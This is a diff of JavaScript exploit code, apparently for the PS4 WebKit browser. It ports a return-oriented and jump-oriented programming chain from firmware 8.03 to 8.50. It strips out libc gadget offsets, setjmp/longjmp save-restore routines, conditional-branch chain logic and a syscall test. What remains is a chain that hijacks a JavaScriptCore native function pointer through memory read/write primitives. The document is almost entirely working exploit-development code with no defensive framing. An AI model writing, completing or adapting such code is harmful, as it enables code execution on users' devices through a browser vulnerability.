@@ -45,34 +45,8 @@ const offset_func_exec = 0x18;
 const offset_textarea_impl = 0x18;
 const offset_js_inline_prop = 0x10;
 
-// WebKit offsets of imported functions
-const offset_wk_stack_chk_fail = 0x8d8;
-const offset_wk_memcpy = 0x918;
-
-// libSceLibcInternal offsets
-const offset_libc_setjmp = 0x258f4;
-const offset_libc_longjmp = 0x29c58;
-
-// see the disassembly of setjmp() from the dump of libSceLibcInternal.sprx
-//
-// int setjmp(jmp_buf)
-// noreturn longjmp(jmp_buf)
-//
-// This version of longjmp() does not take another argument to be used as
-// setjmp()'s return value. Offset 0 of the jmp_buf will be the restored
-// rax. Change it if you want a specific value from setjmp() after the
-// longjmp().
-const jmp_buf_size = 0xc8;
-let setjmp_addr = null;
-let longjmp_addr = null;
-
 // libSceNKWebKit.sprx
 let libwebkit_base = null;
-// libkernel_web.sprx
-let libkernel_base = null;
-// libSceLibcInternal.sprx
-let libc_base = null;
-
 // search for the JOP gadgets
 
 // e.g. jop1:
@@ -117,8 +91,8 @@ const rop_epilogue = 'leave; ret';
 // put missing offset for instruction
 // e.g.
 //     'pop rax; ret' : 0x<offset>,
-/*
 const webkit_gadget_offsets = new Map(Object.entries({
+    /* ignore these for now
     'pop rax; ret' : ,
     'pop rbx; ret' : ,
     'pop rcx; ret' : ,
@@ -158,15 +132,7 @@ const webkit_gadget_offsets = new Map(Object.entries({
     [jop2] : ,
     [jop3] : ,
     [jop4] : ,
-}));
-*/
-
-const libc_gadget_offsets = new Map(Object.entries({
-    'neg rax; ret' : 0x00000000000d3503,
-    'mov rdx, rax; xor eax, eax; shl rdx, cl; ret' : 0x00000000000ce436,
-    'mov qword ptr [rsi], rcx; ret' : 0x00000000000cede2,
-    'setjmp' : offset_libc_setjmp,
-    'longjmp' : offset_libc_longjmp,
+    */
 }));
 
 const gadgets = new Map();
@@ -256,8 +222,8 @@ function create_builtin() {
     return func;
 }
 
-// Chain for PS4 8.03
-class Chain803 extends ChainBase {
+// Chain for PS4 8.50
+class Chain850 extends ChainBase {
     constructor() {
         super();
 
@@ -286,20 +252,6 @@ class Chain803 extends ChainBase {
 
         // JSC::NativeExecutable::m_function
         func_exec.write64(0x38, this.get_gadget(jop1));
-
-        // for conditional jumps
-        this._clean_branch_ctx();
-        this.flag = new Uint8Array(8);
-        this.flag_addr = get_view_vector(this.flag);
-        this.jmp_target1 = new Uint8Array(0x100);
-        rw.write64(this.jmp_target1, 0x50, this.get_gadget(jop4));
-        rw.write64(this.jmp_target1, 0, this.get_gadget(jop5));
-
-        // for save/restore
-        this.is_saved = false;
-        const jmp_buf_size = 0xc8;
-        this.jmp_buf = new Uint8Array(jmp_buf_size);
-        this.jmp_buf_p = get_view_vector(this.jmp_buf);
     }
 
     run() {
@@ -310,235 +262,25 @@ class Chain803 extends ChainBase {
         // jump to JOP chain
         this.func(this.func_argument);
     }
-
-    check_is_branching() {
-        if (this.is_branch_ctx) {
-            throw Error('chain is still branching, end it before running');
-        }
-    }
-
-    push_value(value) {
-        super.push_value(value);
-
-        if (this.is_branch_ctx) {
-            this.branch_position += 8;
-        }
-    }
-
-    _clean_branch_ctx() {
-        this.is_branch_ctx = false;
-        this.branch_position = null;
-        this.delta_slot = null;
-        this.rsp_slot = null;
-        this.rsp_position = null;
-    }
-
-    clean() {
-        super.clean();
-        this._clean_branch_ctx();
-        this.is_saved = false;
-    }
-
-    // Use start_branch() and end_branch() to delimit a ROP chain that will
-    // conditionally execute. rax must be set accordingly before the branch.
-    // rax == 0 means execute the conditional chain.
-    //
-    // example that always execute the conditional chain:
-    //     chain.push_gadget('mov rax, 0; ret');
-    //     chain.start_branch();
-    //     chain.push_gadget('pop rbx; ret'); // always executed
-    //     chain.end_branch();
-    start_branch() {
-        if (this.is_branch_ctx) {
-            throw Error('chain already branching, end it first');
-        }
-
-        const call_target = this.branch_helper_addr;
-
-        // clobbers rax, rcx, rdi, rsi
-        //
-        // u64 flag = 0 if -rax == 0 else 1
-        // *flag_addr = flag
-        this.push_gadget('pop rcx; ret');
-        this.push_constant(-1);
-        this.push_gadget('neg rax; ret');
-        this.push_gadget('pop rsi; ret');
-        this.push_constant(0);
-        this.push_gadget('adc esi, esi; ret');
-        this.push_gadget('pop rdi; ret');
-        this.push_value(this.flag_addr);
-        this.push_gadget('mov qword ptr [rdi], rsi; ret');
-
-        // clobbers rax, rcx, rdi
-        //
-        // rax = *flag_addr
-        // rcx = delta
-        // rax = -rax & rcx
-        // *flag_addr = rax
-        this.push_gadget('pop rax; ret');
-        this.push_value(this.flag_addr);
-        this.push_gadget('mov rax, qword ptr [rax]; ret');
-
-        // dummy value, overwritten later by end_branch()
-        this.push_gadget('pop rcx; ret');
-        this.delta_slot = this.position;
-        this.push_constant(0);
-
-        this.push_gadget('neg rax; and rax, rcx; ret');
-        this.push_gadget('pop rdi; ret');
-        this.push_value(this.flag_addr);
-        this.push_gadget('mov qword ptr [rdi], rax; ret');
-
-        // clobbers rax, rcx, rdx, rsi
-        //
-        // rcx = rsp_position
-        // rsi = rsp
-        // rcx += rsi
-        // rdx = rcx
-        //
-        // dummy value, overwritten later at the end of start_branch()
-        this.push_gadget('pop rcx; ret');
-        this.rsp_slot = this.position;
-        this.push_constant(0);
-
-        this.push_gadget('pop rsi; ret');
-        this.push_value(this.stack_addr.add(this.position + 8));
-
-        // rsp collected here, start counting how much to perturb rsp
-        this.branch_position = 0;
-        this.is_branch_ctx = true;
-
-        this.push_gadget('add rcx, rsi; and rdx, rcx; or rax, rdx; ret');
-        this.push_gadget('mov rdx, rcx; ret');
-
-        // clobbers rax
-        //
-        // rax = *flag_addr
-        this.push_gadget('pop rax; ret');
-        this.push_value(this.flag_addr);
-        this.push_gadget('mov rax, qword ptr [rax]; ret');
-
-        // clobbers rax
-        //
-        // rax += rdx
-        // new_rsp = rax
-        this.push_gadget('add rax, rdx; ret');
-
-        // clobbers rdi
-        //
-        // for debugging, save new_rsp to flag_addr so we can verify it later
-        this.push_gadget('pop rdi; ret');
-        this.push_value(this.flag_addr);
-        this.push_gadget('mov qword ptr [rdi], rax; ret');
-
-        // clobbers rdx, rcx
-        //
-        // rdx = rax
-        this.push_gadget('pop rcx; ret');
-        this.push_constant(0);
-        this.push_gadget('mov rdx, rax; xor eax, eax; shl rdx, cl; ret');
-
-        // clobbers rax, rdx, rdi, rsp
-        //
-        // rsp = rdx
-        this.push_gadget('pop rax; ret');
-        this.push_value(get_view_vector(this.jmp_target1));
-        this.push_gadget('pop rdi; jmp qword ptr [rax + 0x50]');
-        this.push_constant(0); // padding for the push
-
-        this.rsp_position = this.branch_position;
-        rw.write64(this.stack, this.rsp_slot, new Int(this.rsp_position));
-    }
-
-    end_branch() {
-        if (!this.is_branch_ctx) {
-            throw Error('can not end nonbranching chain');
-        }
-
-        const delta = this.branch_position - this.rsp_position;
-        rw.write64(this.stack, this.delta_slot, new Int(delta));
-        this._clean_branch_ctx();
-    }
-
-    // clobbers rax, rdi, rsi
-    push_save() {
-        if (this.is_saved) {
-            throw Error('restore first before saving again');
-        }
-        this.push_call(this.get_gadget('setjmp'), this.jmp_buf_p);
-        this.is_saved = true;
-    }
-
-    // Force a push_restore() if at runtime you can ensure the save/restore
-    // pair line up.
-    push_restore(is_force=false) {
-        if (!this.is_saved && !is_force) {
-            throw Error('save first before restoring');
-        }
-        // modify jmp_buf.rsp
-        this.push_gadget('pop rax; ret');
-        const rsp_slot = this.position;
-        // dummy value, overwritten later at the end of push_restore()
-        this.push_constant(0);
-        this.push_gadget('pop rdi; ret');
-        this.push_value(this.jmp_buf_p.add(0x38));
-        this.push_gadget('mov qword ptr [rdi], rax; ret');
-
-        // modify jmp_buf.return_address
-        this.push_gadget('pop rax; ret');
-        this.push_value(this.get_gadget('ret'));
-        this.push_gadget('pop rdi; ret');
-        this.push_value(this.jmp_buf_p.add(0x80));
-        this.push_gadget('mov qword ptr [rdi], rax; ret');
-
-        this.push_call(this.get_gadget('longjmp'), this.jmp_buf_p);
-
-        // Padding as longjmp() pushes the restored rdi and the return address
-        // at the target rsp.
-        this.push_constant(0);
-        this.push_constant(0);
-        const target_rsp = this.stack_addr.add(this.position);
-
-        rw.write64(this.stack, rsp_slot, target_rsp);
-        this.is_saved = false;
-    }
-
-    push_get_retval() {
-        this.push_gadget('pop rdi; ret');
-        this.push_value(this.retval_addr);
-        this.push_gadget('mov qword ptr [rdi], rax; ret');
-    }
-
-    call(...args) {
-        if (this.position !== 0) {
-            throw Error('call() needs an empty chain');
-        }
-        this.push_call(...args);
-        this.push_get_retval();
-        this.push_gadget('leave; ret');
-        this.run();
-        this.clean();
-    }
-
-    syscall(...args) {
-        if (this.position !== 0) {
-            throw Error('syscall() needs an empty chain');
-        }
-        this.push_syscall(...args);
-        this.push_get_retval();
-        this.push_gadget('leave; ret');
-        this.run();
-        this.clean();
-    }
 }
-const Chain = Chain803;
+const Chain = Chain850;
 
 function rop() {
-    //const jmp_buf = new Uint8Array(jmp_buf_size);
-    //const jmp_buf_p = get_view_vector(jmp_buf);
-    //[libwebkit_base, libkernel_base, libc_base] = get_bases();
     [libwebkit_base] = get_bases();
+    init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
+    Chain.init_class(gadgets, syscall_array);
 
+    const chain = new Chain();
+
+    chain.push_gadget('leave; ret');
+
+    // the ROP chain is a noop, if we crashed, then we did something wrong
+    alert('going to run()');
+    chain.run();
+    alert('returned successfully');
+    debug_log('returned successfully');
+
+    /*
     const view = new Uint8Array(1);
     const vector = get_view_vector(view);
 
@@ -548,143 +290,14 @@ function rop() {
     const func = mem.addrof(eval).readp(offset_func_exec);
     func.write64(0x38, insn);
 
-    
     const obj = {a : 0};
-    alert('try');
     const res = eval(create_jsvalue(vector));
-    alert('success');
     obj.a = res;
+
     // read inline property
     const res2 = mem.addrof(obj).read64(offset_js_inline_prop);
     debug_log(`res2: ${res2}`);
     debug_log(`vector: ${vector}`);
-
-    //init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
-    //init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
-    //init_syscall_array(syscall_array, libkernel_base, 300 * KB);
-    //debug_log('syscall_array:');
-    //debug_log(syscall_array);
-    //Chain.init_class(gadgets, syscall_array);
-
-    /*
-    const chain = new Chain();
-    chain.push_gadget('leave; ret');
-
-    // The ROP chain is a noop. If we crashed, then we did something wrong.
-    alert('chain run');
-    chain.run()
-    alert('returned successfully');
-    */
-
-
-    /*
-    setjmp_addr = gadgets.get('setjmp');
-    longjmp_addr = gadgets.get('longjmp');
-
-    const chain = new Chain();
-    // Instead of writing to the jmp_buf, set rax here so it will be restored
-    // as the return value after the longjmp().
-    chain.push_gadget('pop rax; ret');
-    chain.push_constant(1);
-    chain.push_call(setjmp_addr, jmp_buf_p);
-
-    chain.start_branch();
-
-    debug_log(`if chain addr: ${chain.stack_addr.add(chain.position)}`);
-    chain.push_call(longjmp_addr, jmp_buf_p);
-
-    chain.end_branch();
-
-    debug_log(`endif chain addr: ${chain.stack_addr.add(chain.position)}`);
-    chain.push_gadget('leave; ret');
-
-    // The ROP chain is a noop. If we crashed, then we did something wrong.
-    alert('chain run');
-    debug_log('test call setjmp()/longjmp()');
-    chain.run()
-    alert('returned successfully');
-    debug_log('returned successfully');
-    debug_log('jmp_buf:');
-    debug_log(jmp_buf);
-    debug_log(`flag: ${rw.read64(chain.flag, 0)}`);
-
-    const state1 = new Uint8Array(8);
-    debug_log('test if rax == 0');
-    chain.clean();
-
-    chain.push_gadget('pop rsi; ret');
-    chain.push_value(get_view_vector(state1));
-    chain.push_save();
-    chain.push_gadget('pop rax; ret');
-    chain.push_constant(0);
-
-    chain.start_branch();
-    chain.push_restore();
-
-    chain.push_gadget('pop rcx; ret');
-    chain.push_constant(1);
-    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
-    chain.push_gadget('leave; ret');
-
-    chain.end_branch();
-
-    chain.push_restore(true);
-    chain.push_gadget('pop rcx; ret');
-    chain.push_constant(2);
-    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
-    chain.push_gadget('leave; ret');
-
-    chain.run();
-    debug_log(`state1 must be 1: ${state1}`);
-    if (state1[0] !== 1) {
-        die('if branch not taken');
-    }
-
-    const state2 = new Uint8Array(8);
-    debug_log('test if rax != 0');
-    chain.clean();
-
-    chain.push_gadget('pop rsi; ret');
-    chain.push_value(get_view_vector(state2));
-    chain.push_save();
-    chain.push_gadget('pop rax; ret');
-    chain.push_constant(1);
-
-    chain.start_branch();
-    chain.push_restore();
-
-    chain.push_gadget('pop rcx; ret');
-    chain.push_constant(1);
-    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
-    chain.push_gadget('leave; ret');
-
-    chain.end_branch();
-
-    chain.push_restore(true);
-    chain.push_gadget('pop rcx; ret');
-    chain.push_constant(2);
-    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
-    chain.push_gadget('leave; ret');
-
-    chain.run();
-    debug_log(`state2 must be 2: ${state2}`);
-    if (state2[0] !== 2) {
-        die('if branch taken');
-    }
-
-    debug_log('test syscall getuid()');
-    chain.clean();
-    // Set the return value to some random value. If the syscall worked, then
-    // it will likely change.
-    const magic = 0x4b435546;
-    rw.write32(chain._return_value, 0, magic);
-
-    chain.syscall('getuid');
-
-    debug_log(`return value: ${chain.return_value}`);
-    if (chain.return_value.low() === magic) {
-        die('syscall getuid failed');
-    }
     */
 }
 
